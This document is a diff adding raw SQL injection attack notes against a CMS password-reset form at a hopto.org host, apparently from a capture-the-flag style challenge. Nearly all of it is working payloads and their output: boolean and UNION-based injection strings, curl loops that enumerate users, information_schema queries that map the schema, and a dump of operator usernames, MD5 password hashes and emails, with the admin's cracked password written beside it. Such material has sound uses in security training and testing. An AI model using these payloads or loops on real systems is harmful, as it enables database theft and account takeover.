@@ -1,0 +1,90 @@
+aa@yy.uu' or 1=1 limit 0,1 -- -  						Email sent to: test1@aa.com=>test1 
+aa@yy.uu' or 1=1 limit 0,2 -- -							User not found with that email! 
+aa@yy.uu' or 1=1 limit 1,0 -- -							User not found with that email!
+aa@yy.uu' or 1=1 limit 1,1 -- -							Email sent to: test2@aa.com=>test2 
+aa@yy.uu' or 1=1 limit 2,1 -- -							Email sent to: test3@aa.com=>test3 
+aa@yy.uu' or 1=1 limit 3,1 -- -							Email sent to: test4@aa.com=>test4 
+aa@yy.uu' or 1=1 limit 4,1 -- -							Email sent to: test5@aa.com=>test5 
+aa@yy.uu' or 1=1 limit 5,1 -- -							Email sent to: test6@aa.com=>test6 
+aa@yy.uu' or 1=1 limit 6,1 -- -							Email sent to: test7@aa.com=>test7
+aa@yy.uu' or 1=1 limit 7,1 -- -							Email sent to: test8@aa.com=>test8
+aa@yy.uu' or 1=1 limit 8,1 -- -							Email sent to: test9@aa.com=>test9
+.
+.
+.
+for i in `seq 1 100`; do curl http://decoderit.hopto.org/cmsdata/forgot.php -d "email=aa@yy.uu' or 1=1 limit $i,1 -- -"; done
+.
+.
+aa@yy.uu' or 1=1 limit 100,1 -- -						Email sent to: test101@aa.com=>test101		
+
+for i in `seq 180 250`; do curl http://decoderit.hopto.org/cmsdata/forgot.php -d "email=aa@yy.uu' or 1=1 limit $i,1 -- -" -s|grep to:; done
+
+
+Email sent to: test200@aa.com=>test200    
+Email sent to: adm@nowhere.com=>super_cms_adm    
+Email sent to: decoder@nowhere.com=>decoder    
+				
+
+aa@jjj.com' UnIon SelEct '1@a.com',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'2@a.com','3@a.com' -- -  
+groups,license,operators 
+
+aa@jjj.com' UnIon SelEct '1@a.com',(select group_concat(column_name) from information_schema.columns where table_name="groups"),'2@a.com','3@a.com' -- -
+grpid,userid 
+
+aa@jjj.com' UnIon SelEct '1@a.com',(select group_concat(column_name) from information_schema.columns where table_name="license"),'2@a.com','3@a.com' -- -
+id,license_key
+
+aa@jjj.com' UnIon SelEct '1@a.com',(select group_concat(column_name) from information_schema.columns where table_name="operators"),'2@a.com','3@a.com' -- -
+id,__username_,__password_,email 
+
+aa@jjj.com' UnIon SelEct '1@a.com',group_concat(__username_,0x3a,__password_,0x3a,email),'2@a.com','3@a.com' from operators -- -
+test1:5f4dcc3b5aa765d61d8327deb882cf99:test1@aa.com
+test2:5f4dcc3b5aa765d61d8327deb882cf99:test2@aa.com
+test3:5f4dcc3b5aa765d61d8327deb882cf99:test3@aa.com
+test4:5f4dcc3b5aa765d61d8327deb882cf99:test4@aa.com
+test5:5f4dcc3b5aa765d61d8327deb882cf99:test5@aa.com
+test6:5f4dcc3b5aa765d61d8327deb882cf99:test6@aa.com
+test7:5f4dcc3b5aa765d61d8327deb882cf99:test7@aa.com
+test8:5f4dcc3b5aa765d61d8327deb882cf99:test8@aa.com
+test9:5f4dcc3b5aa765d61d8327deb882cf99:test9@aa.com
+test10:5f4dcc3b5aa765d61d8327deb882cf99:test10@aa.com
+test11:5f4dcc3b5aa765d61d8327deb882cf99:test11@aa.com
+test12:5f4dcc3b5aa765d61d8327deb882cf99:test12@aa.com
+test13:5f4dcc3b5aa765d61d8327deb882cf99:test13@aa.com
+test14:5f4dcc3b5aa765d61d8327deb882cf99:test14@aa.com
+test15:5f4dcc3b5aa765d61d8327deb882cf99:test15@aa.com
+test16:5f4dcc3b5aa765d61d8327deb882cf99:test16@aa.com
+test17:5f4dcc3b5aa765d61d8327deb882cf99:test17@aa.com
+test18:5f4dcc3b5aa765d61d8327deb882cf99:test18@aa.com
+test19:5f4dcc3b5aa765d61d8327deb882cf99:test19@aa.com
+test20:5f4dcc3b5
+
+aa@jjj.com' UnIon SelEct '1@a.com',group_concat(id,__username_,0x3a,__password_,0x3a,email),'2@a.com','3@a.com' from operators where id > 199 -- -
+350test1:5f4dcc3b5aa765d61d8327deb882cf99:test1@aa.com
+351test2:5f4dcc3b5aa765d61d8327deb882cf99:test2@aa.com
+352test3:5f4dcc3b5aa765d61d8327deb882cf99:test3@aa.com
+353test4:5f4dcc3b5aa765d61d8327deb882cf99:test4@aa.com
+354test5:5f4dcc3b5aa765d61d8327deb882cf99:test5@aa.com
+355test6:5f4dcc3b5aa765d61d8327deb882cf99:test6@aa.com
+356test7:5f4dcc3b5aa765d61d8327deb882cf99:test7@aa.com
+357test8:5f4dcc3b5aa765d61d8327deb882cf99:test8@aa.com
+358test9:5f4dcc3b5aa765d61d8327deb882cf99:test9@aa.com
+359test10:5f4dcc3b5aa765d61d8327deb882cf99:test10@aa.com
+360test11:5f4dcc3b5aa765d61d8327deb882cf99:test11@aa.com
+361test12:5f4dcc3b5aa765d61d8327deb882cf99:test12@aa.com
+362test13:5f4dcc3b5aa765d61d8327deb882cf99:test13@aa.com
+363test14:5f4dcc3b5aa765d61d8327deb882cf99:test14@aa.com
+364test15:5f4dcc3b5aa765d61d8327deb882cf99:test15@aa.com
+365test16:5f4dcc3b5aa765d61d8327deb882cf99:test16@aa.com
+366test17:5f4dcc3b5aa765d61d8327deb882cf99:test17@aa.com
+367test18:5f4dcc3b5aa765d61d8327deb882cf99:test18@aa.com
+368test19:5f4dcc
+
+aa@jjj.com' UnIon SelEct '1@a.com',group_concat(id,__username_,0x3a,__password_,0x3a,email),'2@a.com','3@a.com' from operators where id > 545 -- -
+546test197:5f4dcc3b5aa765d61d8327deb882cf99:test197@aa.com
+547test198:5f4dcc3b5aa765d61d8327deb882cf99:test198@aa.com
+548test199:5f4dcc3b5aa765d61d8327deb882cf99:test199@aa.com
+549test200:5f4dcc3b5aa765d61d8327deb882cf99:test200@aa.com
+550super_cms_adm:0b0689ba94f94533400f4decd87fa260:adm@nowhere.com ** tamarro **
+551decoder:5f4dcc3b5aa765d61d8327deb882cf99:decoder@nowhere.com  ** password **
+
